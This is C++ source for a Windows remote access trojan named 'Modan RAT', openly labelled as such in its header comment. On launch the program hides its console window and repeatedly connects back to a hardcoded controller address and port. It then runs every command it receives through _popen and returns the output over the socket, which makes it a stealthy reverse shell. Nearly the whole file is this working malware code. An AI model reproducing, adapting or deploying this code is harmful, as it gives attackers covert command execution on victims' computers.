
/*

Name: Modan RAT
Version: 1.0
Discription: This is a Opensource CLI RAT
Github: 
Author: Shah Jabir Taqi

*/

#include<iostream>   //standard input-output stream
#include<stdio.h>    //Input and Output of C
#include<stdlib.h>   // functions involving memory allocation, process control, conversions and others
#include"unistd.h"   // Not have in Win x64, x84. provides access to the POSIX operating system API. It is defined by the POSIX.1 standard, the base of the Single Unix Specification, and should therefore be available in any POSIX-compliant operating system and compiler.
#include<WinSock2.h> //Network Drivers Prior to Windows Vista, Quality of Service(QOS), Windows Sockets 2
#include<Windows.h>  //Windows-specific header file for the C and C++ programming languages which contains declarations for all of the functions in the Windows API, all the common macros used by Windows programmers, and all the data types used by the various functions and subsystems.
#include<WinUser.h>  //Data Exchange, Desktop Window Manager(DWM), Developer Notes, Dialog Boxes, Display Devices Reference, High DPI, Input Feedback Configuration, Input Source Identification, Internationalization for Windows Applications, Keyboard and Mouse Input, Menus and Other Resources, Mobile Device Management Settings Provider, Pointer Device Input Stack, Pointer Input Messages and Notifications, Remote Desktop Services, Security and Identity, System Services,The Windows Shell, Touch Hit Testing, Touch Injection, Touch Input, Window Stations and Desktops, Windows Accessibility Features, Windows and Messages, Windows Controls, Windows GDI
#include<WinInet.h>  //Developer Notes, Windows Internet
#include<Windowsx.h> //Developer Notes, Windows and Messages, Windows Controls, Windows GDI
#include<string.h>   //required for string functions
#include<sys/stat.h> //the header in the C POSIX library for the C programming language that contains constructs that facilitate getting information about files attributes.
#include<sys/types.h>//The /usr/include/sys/types. h file defines data types used in system source code. Since some system data types are accessible to user code, they can be used to enhance portability across different machines and operating systems.

#define bzero(p, size) (void) memset((p), 0, (size))

int sock;

void Shell()
{
	char buffer[1024];
	char container[1024];
	char total_response[18384];
	while (1)
	{
	jump:
		bzero(buffer, 1024);
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));
		recv(sock, buffer, 1024, 0);

		if (strcmp("q", buffer, 1) == 0)
		{
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		else
		{
			FILE *fp;
			fp = _popen(buffer, "r");
			while (fgets(container,1024,fp)!=NULL)
			{
				strcat(total_response, container);
			}
			send(sock, total_response, sizeof(total_response), 0);
			fclose(fp);
		}
	}
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{

	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);

	struct sockaddr_in ServAddr;
	unsigned short sockaddr;
	char *ServIP;
	WSADATA wsaData;

	ServIP = "127.0.0.1";
	int ServPort = 8023;

	if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
	{
		exit(1);
	}

	sock = socket(AF_INET, SOCK_STREAM, 0);

	memset(&ServAddr, 0, sizeof(ServAddr));
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);

start:
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) !=0)
	{
		Sleep(10);
		goto start;
	}
	Shell();

}

